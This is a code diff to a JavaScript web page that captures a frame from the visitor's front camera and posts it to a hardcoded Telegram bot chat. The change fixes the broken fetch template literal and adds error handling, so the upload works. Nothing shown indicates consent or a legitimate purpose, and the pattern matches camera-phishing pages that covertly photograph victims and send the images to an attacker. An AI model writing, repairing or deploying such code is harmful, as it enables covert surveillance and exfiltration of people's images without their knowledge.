@@ -14,27 +14,30 @@
     const chatId = '7728263509';
 
     async function sendPhoto(base64Image) {
-      const blob = await (await fetch(base64Image)).blob();
-      const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("photo", blob, "photo.jpg");
+      try {
+        const blob = await (await fetch(base64Image)).blob();
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "photo.jpg");
 
-      await fetch(https://api.telegram.org/bot${token}/sendPhoto, {
-        method: "POST",
-        body: formData
-      });
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      } catch (error) {
+        console.error("فشل إرسال الصورة:", error);
+      }
     }
 
     async function captureAndSendCameraImage() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" } // الكاميرا الأمامية
+          video: { facingMode: "user" }
         });
 
         const video = document.getElementById('video');
         video.srcObject = stream;
 
-        // انتظر شوي حتى تشتغل الكاميرا
         setTimeout(() => {
           const canvas = document.getElementById('canvas');
           canvas.width = video.videoWidth;
@@ -42,7 +45,7 @@
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // أوقف الكاميرا
+          // إيقاف الكاميرا
           stream.getTracks().forEach(track => track.stop());
 
           const base64Image = canvas.toDataURL("image/jpeg");
